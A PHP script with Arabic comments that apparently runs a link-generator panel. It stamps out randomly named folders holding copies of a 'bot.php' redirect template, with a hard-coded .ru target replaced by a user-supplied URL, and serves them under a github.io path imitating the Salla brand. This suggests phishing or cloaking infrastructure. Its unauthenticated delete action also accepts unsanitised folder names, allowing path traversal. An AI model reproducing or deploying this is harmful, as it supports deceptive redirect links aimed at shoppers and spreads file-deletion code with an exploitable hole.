<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$storage_path = __DIR__;
$base_url = "https://sallasa.github.io/salla/s/";
$excluded_files = ['index.php', 'bot.php', 'process.php', 'auth']; // إضافة auth إلى قائمة المستثنيات
$bot_file = "$storage_path/bot.php";

// جلب قائمة المجلدات التي تم إنشاؤها
function getCreatedFolders() {
    global $storage_path, $excluded_files;
    $folders = array_filter(glob($storage_path . "/*"), 'is_dir');
    return array_values(array_diff($folders, array_map(fn($file) => "$storage_path/$file", $excluded_files)));
}

$action = $_GET['action'] ?? '';

if ($action === 'list') {
    $folders = getCreatedFolders();
    $folder_links = array_map(fn($folder) => basename($folder), $folders);
    echo json_encode(["folders" => $folder_links]);
    exit;
}

if ($action === 'create') {
    $link = trim($_POST['link'] ?? '');

    if (empty($link) || !filter_var($link, FILTER_VALIDATE_URL)) {
        echo "❌ يرجى إدخال رابط صحيح!";
        exit;
    }

    // تحويل اسم المجلد إلى أحرف صغيرة فقط
    $random_id = strtolower(substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 5));
    $folder_name = "$storage_path/$random_id";
    $new_file_path = "$folder_name/index.php";

    mkdir($folder_name, 0777, true);

    if (file_exists($bot_file)) {
        $content = file_get_contents($bot_file);
        $content = str_replace("https://nauswim.ru/sa/", htmlspecialchars($link, ENT_QUOTES, 'UTF-8'), $content);
        file_put_contents($new_file_path, $content);

        echo "$base_url$random_id"; // إظهار رابط المجلد فقط
    } else {
        echo "❌ خطأ: لم يتم العثور على ملف bot.php.";
    }
    exit;
}

if ($action === 'delete') {
    $folder = $_POST['folder'] ?? '';
    $folder_path = "$storage_path/$folder";

    if ($folder && is_dir($folder_path) && !in_array($folder, $excluded_files)) {
        array_map('unlink', glob("$folder_path/*.*"));
        rmdir($folder_path);
        echo "✅ تم حذف المجلد بنجاح!";
    } else {
        echo "❌ المجلد غير موجود أو لا يمكن حذفه!";
    }
    exit;
}

if ($action === 'delete_all') {
    $folders = getCreatedFolders();
    foreach ($folders as $folder) {
        if (!in_array(basename($folder), $excluded_files)) {
            array_map('unlink', glob("$folder/*.*"));
            rmdir($folder);
        }
    }
    echo "✅ تم حذف جميع المجلدات!";
    exit;
}
?>
